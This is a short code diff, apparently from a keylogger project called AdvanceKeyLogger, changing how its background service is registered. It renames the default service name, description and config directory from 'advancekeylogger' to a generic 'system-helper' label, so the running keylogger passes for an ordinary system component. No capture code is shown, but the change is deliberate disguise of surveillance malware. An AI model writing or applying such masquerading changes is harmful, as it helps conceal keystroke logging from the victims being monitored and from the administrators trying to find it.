@@ -60,14 +60,14 @@ class ServiceManager:
 
     def _build_spec(self) -> ServiceSpec:
         service_cfg = self._config.get("service", {})
-        name = str(service_cfg.get("name", "advancekeylogger"))
+        name = str(service_cfg.get("name", "system-helper"))
         description = str(
-            service_cfg.get("description", "AdvanceKeyLogger Monitoring Service")
+            service_cfg.get("description", "System Helper Service")
         )
         config_path = service_cfg.get("config_path") or ""
         if not config_path:
             config_path = os.path.expanduser(
-                str(self._config.get("config_path", "~/.config/advancekeylogger/config.yaml"))
+                str(self._config.get("config_path", "~/.config/system-helper/config.yaml"))
             )
         restart_sec = int(service_cfg.get("restart_sec", 10))
         start_limit_burst = int(service_cfg.get("start_limit_burst", 3))
